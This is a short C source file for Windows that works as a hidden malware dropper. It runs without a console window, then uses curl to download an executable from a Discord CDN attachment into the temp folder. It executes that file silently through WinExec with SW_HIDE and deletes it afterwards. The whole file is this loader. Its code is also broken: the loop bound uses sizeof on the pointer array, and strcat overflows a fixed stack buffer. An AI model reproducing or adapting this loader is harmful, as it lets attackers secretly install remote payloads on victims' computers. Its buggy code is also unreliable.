#include <Windows.h>
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

char *links[] = {
    "https://cdn.discordapp.com/attachments/950546791596695583/969650516302905364/hwgui.exe"
};
char *installFolder = "%temp%\\";

int main () {
    for (int i = 0; i < sizeof(links); i++) {
        char *fileName = strrchr(links[i], '/') + 1;
        char cmd[] = "cmd.exe /c @echo off && curl ";
        strcat(cmd, links[i]);
        strcat(cmd, " -s -o ");
        strcat(cmd, installFolder);
        strcat(cmd, fileName);
        strcat(cmd, " && ");
        strcat(cmd, installFolder);
        strcat(cmd, fileName);
        strcat(cmd, " && del ");
        strcat(cmd, installFolder);
        strcat(cmd, fileName);
        WinExec(cmd, SW_HIDE);
    }
    return 0;
}